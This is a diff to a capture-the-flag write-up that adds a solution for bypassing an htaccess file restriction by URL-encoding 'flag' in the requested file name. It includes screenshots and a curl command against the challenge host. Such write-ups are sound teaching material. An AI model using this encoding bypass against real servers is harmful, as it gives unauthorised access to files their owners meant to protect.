@@ -115,3 +115,10 @@ And what will happen is that the htaccess check will return False but where as o
 
 This solution was given to me by @0xvenus
 
+First I urlencoded `flag` then used it as the file name in the url
+![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/6de8e1a8-13a0-4242-af01-ea1aa06fa2a7)
+![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/aefe0048-9e87-4026-bf53-8a1fc6aa5ef9)
+
+```
+curl htaccess.uctf.ir/two/%66%6c%61%67.txt;echo
+```
